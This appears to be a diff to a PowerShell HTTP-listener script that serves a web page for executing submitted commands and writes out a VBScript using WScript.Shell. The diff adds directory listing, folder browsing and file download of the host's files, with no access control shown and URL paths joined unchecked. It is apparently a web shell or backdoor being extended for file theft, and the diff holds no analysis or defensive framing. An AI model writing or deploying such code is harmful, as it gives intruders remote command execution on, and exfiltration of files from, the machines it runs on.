@@ -103,6 +103,17 @@ while ($httpsrvlsnr.IsListening) {
             $html += "<input type='submit' value='Execute'>"
             $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
             $html += "</form></ul>"
+            $html += "<h1>File Listing</h1><ul>"
+            $files = Get-ChildItem -Path $PWD.Path -Force
+            foreach ($file in $files) {
+                $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
+                if ($file.PSIsContainer) {
+                    $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
+                } else {
+                    $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
+                }
+            }
+            $html += "</ul><hr>"
             $html += "</body></html>"
             $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
             $ctx.Response.ContentLength64 = $buffer.Length;
@@ -112,7 +123,53 @@ while ($httpsrvlsnr.IsListening) {
             $httpsrvlsnr.Stop();
             Remove-PSDrive -Name webroot -PSProvider FileSystem;
         }
+        elseif ($ctx.Request.RawUrl -match "^/download/.+") {
+            $filePath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/download", "")
+            if ([System.IO.File]::Exists($filePath)) {
+                $ctx.Response.ContentType = 'application/octet-stream'
+                $ctx.Response.ContentLength64 = (Get-Item -Path $filePath).Length
+                $fileStream = [System.IO.File]::OpenRead($filePath)
+                $fileStream.CopyTo($ctx.Response.OutputStream)
+                $ctx.Response.OutputStream.Flush()
+                $ctx.Response.Close()
+                $fileStream.Close()
+            }
+        }
+        elseif ($ctx.Request.RawUrl -match "^/browse/.+") {
+            $folderPath = Join-Path -Path $PWD.Path -ChildPath ($ctx.Request.RawUrl -replace "^/browse", "")
+            if ([System.IO.Directory]::Exists($folderPath)) {
+                
+            $html = "<html><head><style>"
 
+            $html += "body { font-family: Arial, sans-serif; margin: 30px; background-color: #6a3278; }"
+            $html += "h1 { color: #FFF; }"
+            $html += "a { color: #007BFF; text-decoration: none; }"
+            $html += "a:hover { text-decoration: underline; }"
+            $html += "ul { list-style-type: none; padding-left: 0; }"
+            $html += "li { margin-bottom: 5px; }"
+            $html += "textarea { width: 100%; padding: 10px; font-size: 14px; }"
+            $html += "input[type='submit'] { margin-top: 10px; padding: 5px 10px; background-color: #40ad24; color: #FFF; border: none; border-radius: 4px; cursor: pointer; }"
+            $html += "button { background-color: #40ad24; color: #FFF; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }"
+            $html += "pre { background-color: #f7f7f7; padding: 10px; border-radius: 4px; }"
+
+            $html += "</style></head><body>"
+
+                $html += "<h3>Contents of $folderPath</h3><ul>"
+                $files = Get-ChildItem -Path $folderPath -Force
+                foreach ($file in $files) {
+                    $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
+                    if ($file.PSIsContainer) {
+                        $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
+                    } else {
+                        $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
+                    }
+                }
+                $html += "</ul></body></html>"
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
+                $ctx.Response.ContentLength64 = $buffer.Length;
+                $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
+            }
+        }
         elseif ($ctx.Request.RawUrl -match "^/update") {     
 $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
